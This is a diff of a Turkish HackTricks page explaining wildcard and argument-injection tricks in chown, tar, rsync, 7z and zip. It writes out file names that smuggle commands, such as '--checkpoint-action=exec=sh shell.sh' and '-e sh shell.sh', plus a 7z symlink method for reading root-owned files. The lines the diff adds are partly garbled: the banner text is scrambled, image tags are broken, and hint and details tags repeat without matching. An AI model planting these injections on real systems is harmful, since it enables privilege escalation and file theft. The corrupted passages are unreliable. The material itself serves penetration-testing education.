@@ -1,40 +1,44 @@
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>
+<dotsilp>
 
-HackTricks'ı desteklemenin diğer yolları:
+<oummpr>SupportHackTricks</smmay>
 
-* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
 ## chown, chmod
 
-**Diğer dosyalar için hangi dosya sahibi ve izinlerini kopyalamak istediğinizi belirtebilirsiniz**
+**Hangi dosya sahibini ve izinlerini diğer dosyalar için kopyalamak istediğinizi belirtebilirsiniz.**
 ```bash
 touch "--reference=/my/own/path/filename"
 ```
-Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombine saldırı)_ kullanarak sömürülebilir.\
+You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
 Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Tar
 
-**Keyfi komutları çalıştır:**
+**Rasgele komutlar çalıştırın:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) kullanarak sömürülebilir _(tar saldırısı)_\
-Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar saldırısı)_ kullanılarak istismar edilebilir.\
+Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) adresine bakın.
 
 ## Rsync
 
-**Keyfi komutları çalıştır:**
+**Rasgele komutlar çalıştırın:**
 ```bash
 Interesting rsync option from manual:
 
@@ -45,41 +49,49 @@ Interesting rsync option from manual:
 ```bash
 touch "-e sh shell.sh"
 ```
-Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) kullanarak sömürülebilir. _(_rsync _attack)_\
-Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ kullanılarak istismar edilebilir.\
+Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) adresine bakın.
 
 ## 7z
 
-**7z**'de, `*`'den önce `--` kullanarak (not: `--`, takip eden girişin parametre olarak işleme alınamayacağı anlamına gelir, bu durumda sadece dosya yolları) bir dosyayı okumak için keyfi bir hata oluşturabilirsiniz. Bu durumda root tarafından aşağıdaki gibi bir komut çalıştırılıyorsa:
+**7z** içinde `--` kullanarak `*`'dan önce (not: `--` sonraki girdinin parametre olarak işlenemeyeceği anlamına gelir, bu durumda sadece dosya yolları) rastgele bir hatanın bir dosyayı okumasına neden olabilirsiniz, bu nedenle aşağıdaki gibi bir komut root tarafından çalıştırılıyorsa:
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
-Ve bu yürütülen klasörde dosyalar oluşturabilirsiniz, `@root.txt` dosyasını ve `root.txt` dosyasını oluşturabilirsiniz, bu dosya istediğiniz dosyanın bir **sembolik bağlantısı** olabilir:
+Ve bu işlemin gerçekleştirildiği klasörde dosyalar oluşturabilirsiniz, `@root.txt` dosyasını ve okumak istediğiniz dosyaya **symlink** olan `root.txt` dosyasını oluşturabilirsiniz:
 ```bash
 cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
-Ardından, **7z** çalıştırıldığında, `root.txt`'yi sıkıştırması gereken dosyaların listesini içeren bir dosya olarak işleyecektir (`@root.txt`'nin varlığı bunu gösterir) ve 7z `root.txt`'yi okuduğunda `/file/you/want/to/read`'i okuyacak ve **bu dosyanın içeriği bir dosya listesi olmadığı için bir hata fırlatacaktır** ve içeriği gösterecektir.
+Sonra, **7z** çalıştırıldığında, `root.txt` dosyasını sıkıştırması gereken dosyaların listesini içeren bir dosya olarak ele alacaktır (bu, `@root.txt` varlığının gösterdiği şeydir) ve 7z `root.txt` dosyasını okuduğunda `/file/you/want/to/read` dosyasını okuyacak ve **bu dosyanın içeriği bir dosya listesi olmadığından, bir hata verecektir** içeriği göstererek.
 
-_Daha fazla bilgi için HackTheBox'tan CTF kutusu Write-up'larında._ 
+_HackTheBox'tan CTF kutusunun yazılımlarında daha fazla bilgi._
 
 ## Zip
 
-**Keyfi komutları çalıştırma:**
+**Rasgele komutlar çalıştır:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
+```markdown
+{% hnt stye="acceas" %}
+AWS Hacking Pratikleri:<img src="/.gitbook/assets/aite.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Deneyimi (ARTE)**](https://github.com/carlospolop/hacktricks) <img src="/.gitbook/assets/k.png" alt="" data-size="line">\
+GCP Hacking Pratikleri<img src="/.gitbook/assets/gte.png" alt="" data-size="line">[**GCP Kırmızı Takım Deneyimi (GE)**](https://github.com/carlospolop/hacktricks)
+
 <details>
 
-<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
+* [**GitHub'da abonelik planlarını kontrol edin**](https://github.com/sponsors/carlospolop)!
+* [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**Telegram grubuna**](https://t.me/peass) katılın ya da **bizi Twitter'da takip edin** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub reposuna PR gönderin.
 
-* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+```
